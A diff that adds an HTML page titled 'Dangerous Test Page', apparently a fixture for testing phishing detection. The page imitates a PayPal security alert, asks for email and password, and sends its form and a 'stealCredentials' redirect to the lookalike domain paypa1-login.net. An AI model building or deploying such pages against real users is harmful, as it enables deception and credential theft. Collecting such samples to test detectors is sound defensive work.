@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="refresh" content="5;url=https://example.com" />
+  <title>Dangerous Test Page</title>
+  <script>
+    function stealCredentials() {
+      location.href = 'https://paypa1-login.net/submit';
+    }
+  </script>
+</head>
+<body>
+  <h1>Security Alert</h1>
+  <p>Your PayPal session has been suspended. Confirm your identity now.</p>
+  <form action="https://paypa1-login.net/verify" method="post">
+    <label for="email">Email</label>
+    <input id="email" type="email" />
+    <label for="password">Password</label>
+    <input id="password" type="password" />
+    <input type="hidden" name="session_token" value="xyz" />
+    <button type="button" onclick="stealCredentials()">Continue</button>
+  </form>
+</body>
+</html>
